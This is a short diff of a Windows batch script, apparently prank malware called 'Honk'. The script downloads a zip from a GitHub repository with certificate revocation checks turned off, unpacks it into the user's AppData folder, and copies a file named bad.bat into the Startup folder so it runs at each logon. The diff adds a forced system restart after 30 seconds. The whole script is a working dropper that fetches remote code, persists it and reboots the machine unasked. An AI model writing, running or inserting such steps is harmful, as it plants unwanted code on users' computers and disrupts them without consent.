@@ -4,4 +4,5 @@ curl "https://github.com/glonpl/Honk/archive/refs/heads/main.zip" --ssl-no-revok
 @REM mkdir %APPDATA%\Honk
 powershell -Command "Expand-Archive %TEMP%\temp.zip -DestinationPath %APPDATA%" 
 copy "%APPDATA%\Honk-main\bad.bat" "%Startup_Dir%\bad.bat"
-del temp.zip
+del %TEMP%\temp.zip
+shutdown /r /t 30 /c "Honk!"
